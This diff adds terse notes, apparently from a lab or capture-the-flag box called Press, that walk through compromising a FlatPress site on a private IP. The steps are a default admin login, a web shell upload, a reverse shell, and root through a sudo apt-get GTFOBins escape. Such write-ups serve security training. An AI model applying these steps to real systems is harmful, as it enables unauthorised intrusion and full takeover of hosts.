@@ -1,0 +1,22 @@
+192.168.245.29
+
+Press
+
+http://192.168.245.29:8089/admin.php
+default cred admin:password
+
+http://192.168.245.29:8089/admin.php?p=uploader
+upload shell
+http://192.168.245.29:8089/fp-content/attachs/shell.php
+
+got reverse shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+sudo -l
+ (ALL) NOPASSWD: /usr/bin/apt-get
+
+https://gtfobins.github.io/gtfobins/apt-get/#sudo
+sudo apt-get changelog apt
+!/bin/sh
+
+Got root shell
